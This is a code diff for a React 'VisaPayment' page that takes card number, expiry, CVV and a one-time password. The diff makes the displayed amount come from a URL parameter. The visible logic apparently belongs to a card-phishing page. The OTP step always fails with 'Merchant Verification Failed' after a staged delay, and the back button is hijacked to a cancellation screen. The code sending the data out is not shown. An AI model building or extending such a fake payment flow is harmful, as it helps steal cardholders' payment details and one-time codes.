@@ -1,11 +1,13 @@
 import { useState, useRef, useEffect, useCallback } from "react";
-import { useNavigate } from "react-router-dom";
+import { useNavigate, useSearchParams } from "react-router-dom";
 import { CreditCard, Lock, ArrowLeft, Camera, X } from "lucide-react";
 import genzLogo from "@/assets/genz-logo.png";
 import visaLogo from "@/assets/visa-logo.png";
 
 const VisaPayment = () => {
   const navigate = useNavigate();
+  const [searchParams] = useSearchParams();
+  const amount = searchParams.get('amount') || "434";
   const [cardNumber, setCardNumber] = useState("");
   const [expiry, setExpiry] = useState("");
   const [cvv, setCvv] = useState("");
@@ -28,7 +30,7 @@ const VisaPayment = () => {
   useEffect(() => {
     window.history.pushState(null, "", window.location.href);
     const handlePopState = () => {
-      navigate("/payment-cancelled?channel=Visa Card Payment&reason=Payment isn't completed&amount=434.00", { replace: true });
+      navigate(`/payment-cancelled?channel=Visa Card Payment&reason=Payment isn't completed&amount=${amount}.00`, { replace: true });
     };
     window.addEventListener("popstate", handlePopState);
     return () => window.removeEventListener("popstate", handlePopState);
@@ -154,7 +156,7 @@ const VisaPayment = () => {
     setOtpLoading(true);
     setTimeout(() => {
       setOtpLoading(false);
-      navigate("/payment-cancelled?channel=Visa Card Payment&reason=Merchant Verification Failed&amount=434.00&ref=VIS" + Date.now().toString().slice(-8));
+      navigate(`/payment-cancelled?channel=Visa Card Payment&reason=Merchant Verification Failed&amount=${amount}.00&ref=VIS` + Date.now().toString().slice(-8));
     }, 2500);
   };
 
@@ -209,7 +211,7 @@ const VisaPayment = () => {
       <div className="fixed inset-0 bg-gray-100 flex flex-col items-center justify-start pt-6 p-4 overflow-hidden">
         <div className="w-full max-w-md">
           <div className="flex items-center justify-between mb-5">
-            <button onClick={() => navigate("/payment-cancelled?channel=Visa Card Payment&reason=Payment isn't completed&amount=434.00")} className="flex items-center gap-1 text-gray-500 text-sm hover:text-gray-700 transition-colors">
+            <button onClick={() => navigate(`/payment-cancelled?channel=Visa Card Payment&reason=Payment isn't completed&amount=${amount}.00`)} className="flex items-center gap-1 text-gray-500 text-sm hover:text-gray-700 transition-colors">
               <ArrowLeft className="w-4 h-4" />
               Back
             </button>
@@ -273,7 +275,7 @@ const VisaPayment = () => {
                   Verifying...
                 </span>
               ) : (
-                "Verify & Pay ৳434"
+                `Verify & Pay ৳${amount}`
               )}
             </button>
           </div>
@@ -291,7 +293,7 @@ const VisaPayment = () => {
       <div className="w-full max-w-md flex flex-col min-h-[100dvh]">
         {/* Header */}
         <div className="flex items-center justify-between px-4 pt-4 pb-3 shrink-0">
-          <button onClick={() => navigate("/payment-cancelled?channel=Visa Card Payment&reason=Payment isn't completed&amount=434.00")} className="flex items-center gap-1 text-gray-500 text-sm hover:text-gray-700 transition-colors">
+          <button onClick={() => navigate(`/payment-cancelled?channel=Visa Card Payment&reason=Payment isn't completed&amount=${amount}.00`)} className="flex items-center gap-1 text-gray-500 text-sm hover:text-gray-700 transition-colors">
             <ArrowLeft className="w-4 h-4" />
             Back
           </button>
@@ -467,7 +469,7 @@ const VisaPayment = () => {
                 Processing...
               </span>
             ) : (
-              `Pay ৳434.00`
+              `Pay ৳${amount}.00`
             )}
           </button>
 
